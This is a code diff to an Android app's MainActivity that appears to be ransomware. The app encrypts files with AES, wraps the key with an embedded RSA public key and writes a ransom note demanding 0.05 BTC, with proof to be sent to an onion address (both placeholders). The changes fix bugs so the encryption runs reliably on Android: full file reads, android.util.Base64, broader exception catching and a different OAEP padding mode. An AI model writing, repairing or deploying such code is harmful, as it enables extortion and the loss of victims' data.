@@ -6,6 +6,7 @@ import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
+import android.util.Base64;
 import android.widget.TextView;
 
 import java.io.File;
@@ -16,7 +17,6 @@ import java.security.PublicKey;
 import java.security.SecureRandom;
 import java.security.spec.X509EncodedKeySpec;
 import java.util.ArrayList;
-import java.util.Base64;
 import java.util.List;
 
 import javax.crypto.Cipher;
@@ -90,8 +90,9 @@ public class MainActivity extends Activity {
                 final int total = done;
                 runOnUiThread(() -> log.setText(
                     "Encrypted: " + total + " files\nNote: " + note.getAbsolutePath()));
-            } catch (Exception e) {
-                runOnUiThread(() -> log.setText("ERR: " + e));
+            } catch (Throwable e) {
+                final String msg = e.toString();
+                runOnUiThread(() -> log.setText("ERR: " + msg));
             }
         }).start();
     }
@@ -122,7 +123,11 @@ public class MainActivity extends Activity {
         if (in.getName().endsWith(".enc")) return;
         FileInputStream fis = new FileInputStream(in);
         byte[] plain = new byte[(int) in.length()];
-        fis.read(plain);
+        int read = 0, total = 0;
+        while ((read = fis.read(plain, total, plain.length - total)) > 0) {
+            total += read;
+            if (total >= plain.length) break;
+        }
         fis.close();
 
         byte[] iv = new byte[12];
@@ -146,11 +151,12 @@ public class MainActivity extends Activity {
         return kg.generateKey();
     }
 
+    // RSA-OAEP wrap; OAEPPadding lets the provider pick SHA-1/SHA-256 defaults
     private byte[] rsaWrap(byte[] aesKey) throws Exception {
-        byte[] der = Base64.getDecoder().decode(RSA_PUB_PEM);
+        byte[] der = Base64.decode(RSA_PUB_PEM, Base64.DEFAULT);
         PublicKey pub = KeyFactory.getInstance("RSA")
                 .generatePublic(new X509EncodedKeySpec(der));
-        Cipher rsa = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
+        Cipher rsa = Cipher.getInstance("RSA/ECB/OAEPPadding");
         rsa.init(Cipher.ENCRYPT_MODE, pub);
         return rsa.doFinal(aesKey);
     }
@@ -161,7 +167,7 @@ public class MainActivity extends Activity {
         sb.append("Pay 0.05 BTC to: bc1qexampleaddressxxxxxxxxxxxxx\n");
         sb.append("Send proof to: example.onion\n\n");
         sb.append("Wrapped AES key (base64):\n");
-        sb.append(Base64.getEncoder().encodeToString(wrapped));
+        sb.append(Base64.encodeToString(wrapped, Base64.NO_WRAP));
         sb.append("\n");
         FileOutputStream fos = new FileOutputStream(note);
         fos.write(sb.toString().getBytes());
